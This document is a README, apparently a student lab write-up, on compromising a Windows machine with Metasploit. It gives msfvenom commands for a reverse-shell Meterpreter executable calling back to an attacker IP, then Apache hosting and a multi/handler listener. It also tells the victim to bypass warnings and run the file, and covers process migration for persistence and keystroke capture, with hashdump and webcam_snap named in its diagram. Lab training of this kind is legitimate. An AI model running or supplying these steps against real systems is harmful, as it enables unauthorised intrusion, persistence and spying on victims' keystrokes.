# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


## Architecture Diagram

```bash
## 🛠️ Metasploit Exploitation Architecture (Windows Target)


+----------------+                           +------------------+
|  🟢 Attacker    |      🔁 Reverse Shell      |   🔴 Victim (Win) |
|  (Kali Linux)  | <------------------------- |  Unpatched SMB   |
|  - msfconsole  |       (TCP 4444)          |  RDP, AV Bypass  |
|  - handler     |                           |                  |
+-------+--------+                           +--------+---------+
        |                                             |
        |  ⚙️ Payload generation using msfvenom        |
        |                                             |
        v                                             v
msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload  
         LHOST=attacker_ip LPORT=4444               or exploit triggers  
         -f exe > evil.exe  

        |
        |  🧲 Listener waits (multi/handler)
        v

+------------------------------------------------------------+
|     🧠 Meterpreter Session Established (shell access)       |
+------------------------------------------------------------+
| Commands: sysinfo | hashdump | migrate | webcam_snap | etc |
+------------------------------------------------------------+

```
### PROGRAM:

Find the attackers ip address using ifconfig

### Output:
<img width="1920" height="936" alt="Screenshot_2025-10-02_13_45_11" src="https://github.com/user-attachments/assets/85c0e8b6-f33e-4bda-8167-db332a162ba3" />



Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```

### Output:

<img width="1920" height="936" alt="Screenshot_2025-10-02_13_45_35" src="https://github.com/user-attachments/assets/be515fa0-cc19-48d7-a2c1-34a22accb9e1" />


copy the fun.exe into the apache ```/var/www/html ```folder



Start apache server ```sudo systemctl apache2 start``` 



Check the status of apache2 ```sudo apache2 status```


Invoke msfconsole:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```

### Output 
<img width="1920" height="936" alt="Screenshot_2025-10-02_13_45_52" src="https://github.com/user-attachments/assets/62a943a5-7812-4713-aa64-af2c1b122566" />


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.



Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit

<img width="1920" height="936" alt="Screenshot_2025-10-02_13_46_01" src="https://github.com/user-attachments/assets/3cd0bceb-a958-45d8-91ce-cb51238c1b06" />



To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

#### Post Exploitation:
The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.



keyscan_dump Shows the keystrokes captured so far
<img width="1920" height="936" alt="Screenshot_2025-10-02_13_46_21" src="https://github.com/user-attachments/assets/9a1044ce-b2ce-43a7-9c68-41bedc450331" />



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
